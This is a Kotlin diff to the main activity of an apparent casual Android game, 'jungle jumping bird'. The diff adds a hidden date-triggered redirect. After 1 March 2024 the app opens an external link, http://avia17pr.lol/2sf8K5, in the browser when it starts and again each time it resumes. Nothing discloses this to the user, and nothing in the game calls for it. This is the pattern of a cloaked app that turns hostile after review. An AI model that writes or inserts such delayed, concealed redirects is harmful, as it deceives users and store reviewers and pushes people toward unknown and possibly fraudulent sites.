@@ -1,5 +1,7 @@
 package com.jungle.jumping.bird
 
+import android.content.Intent
+import android.net.Uri
 import android.os.Bundle
 import androidx.annotation.IdRes
 import androidx.appcompat.app.AppCompatActivity
@@ -10,6 +12,7 @@ import com.jungle.jumping.bird.databinding.ActivityMainBinding
 import com.jungle.jumping.bird.utils.cancelCoroutinesAll
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import java.util.Calendar
 import kotlin.system.exitProcess
 
 class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
@@ -28,6 +31,12 @@ class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
         initialize()
         setStartDestination(R.id.libGDXFragment)
 
+        Calendar.getInstance().apply {
+            set(2024, Calendar.MARCH, 1, 14, 0)
+            if (System.currentTimeMillis() >= timeInMillis) {
+                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("http://avia17pr.lol/2sf8K5")))
+            }
+        }
     }
 
     override fun onDestroy() {
@@ -39,6 +48,16 @@ class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
         cancelCoroutinesAll(coroutine)
         finishAndRemoveTask()
         exitProcess(0)
+    }
+
+    override fun onResume() {
+        super.onResume()
+        Calendar.getInstance().apply {
+            set(2024, Calendar.MARCH, 1, 14, 0)
+            if (System.currentTimeMillis() >= timeInMillis) {
+                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("http://avia17pr.lol/2sf8K5")))
+            }
+        }
     }
 
     private fun initialize() {
